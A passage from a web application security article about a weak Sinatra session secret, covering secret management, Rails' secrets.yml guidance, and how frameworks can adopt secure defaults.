        like [1Password Teams](https://1password.com/teams/), [
        Dashlane Business](https://www.dashlane.com/teams), or [pass](https://www.passwordstore.org/)


Alternatively, instead of storing session data on the client and using a
        session secret to ensure its integrity, we could have used [Rack::Session::Pool](http://www.rubydoc.info/github/rack/rack/Rack/Session/Pool)
        to store the data on the server and associate it with a specific clients using a
        random session identifier stored in a cookie. This strategy eliminates the need for a secret in this case,
        but keep in mind that almost every application will have secrets that need to
        be managed properly. Database passwords, API keys, TLS private keys, and any other cryptographic tokens
        can all be catastrophic if leaked or generated insecurely -- so it's probably worth thinking
        about your secret management strategy anyway. You can read more about secure session management
        using random session identifiers in this article on [The Basics of Web Application Security](https://martinfowler.com/articles/web-security-basics.html#ProtectUserSessions).


### For library and framework authors


Ideally, this attitude would spread beyond delivery teams and into frameworks
        and libraries as well. Rails, for example, has done a good job in recent years of
        emphasizing the importance of secret management in its generated configuration
        file:


file config/secrets.ymlâ¦


```
  
  # [snip]
  
  # Make sure the secret is at least 30 characters and all random,
  # no regular words or you'll be exposed to dictionary attacks.
  # You can use `rails secret` to generate a secure secret key.
  
  # [snip]
  
  # Do not keep production secrets in the repository,
  # instead read values from the environment.
  production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>]]></pre>
```


Unfortunately, at the time I discovered this vulnerability, Sinatra was not so clear in
        their documentation:


![](session-secret/sinatra-session-secret-docs-old.png)


First, there is no indication how to generate a value to use in place of 'super
        secret'. How long should it be? Are two dictionary words ârandomâ enough? The example only
        has two words, so that would make sense. Once we have a secret, should it be checked into
        source control? The rest of this configuration file is, so that must be the thing to
        do.


You may also remember from the beginning of this article that this example from the
        documentation is exactly what we found in our application. While copying and pasting code
        like this and using it without question is definitely a bad practice, it's easy to imagine
        ways this slipped through the cracks. Maybe the developer added the line quickly to pass a
        test, meaning to go back later and change it, but forgot because everything was âgreenâ.
        Maybe they went off to research how to generate the correct key when a high priority
        production issue was discovered and needed immediate attention.


If the Sinatra examples had showed using environment variables for secrets and clearly
        described a secure method for secret generation, I likely wouldn't be writing this.


Lastly, there are some code design choices that could have been made in Sinatra and
        Rack that could have prevented this from occurring. Sinatra could add validation to
        :session_secret, checking that it is, say, 64 bytes of hex-encoded data. Doing so would
        make it a lot more difficult to mistakenly set a value that is too weak. On Rack's side of
        things, while being able to serialize and deserialize native Ruby objects is convenient,
        it's a strategy that has been shown to be insecure. It violates the secure development
        principle âSeparation of Data and Code,â giving attackers an opportunity to change code
        paths in unexpected ways by manipulating input data. Even though the cookie data is
        supposed to be trusted, the principle of âDefense in Depthâ encourages us to consider
        attackers that have already managed to bypass some of our mitigations.


## Conclusion


In the end, the good news is that there are many places where this issue could
      have been prevented.


Application developers can keep basic security Awareness in mind, and help to
      create a culture that takes security seriously. One of the key principles to keep in
      mind is Keeping Secrets Secret. Generating secrets using a cryptographically secure
      random number generator and developing a secret management strategy will help us
      achieve this.


Library and framework authors can include examples and initial settings that are
      Secure by Default, and follow secure development guidelines like Separation of Data
      and Code and Defense in Depth.


In fact, Sinatra now [recommends including the session secret from an environment
      variable](https://github.com/sinatra/sinatra/issues/1187), and provide clear instructions on how to generate the key safely. Thanks
      [@zzak](https://github.com/zzak) and [@grempe](https://github.com/grempe)!


Hopefully as our industry continues to become more aware of the impacts of
      software vulnerabilities we will continue to see more proactive controls like these
      put into practice.


---
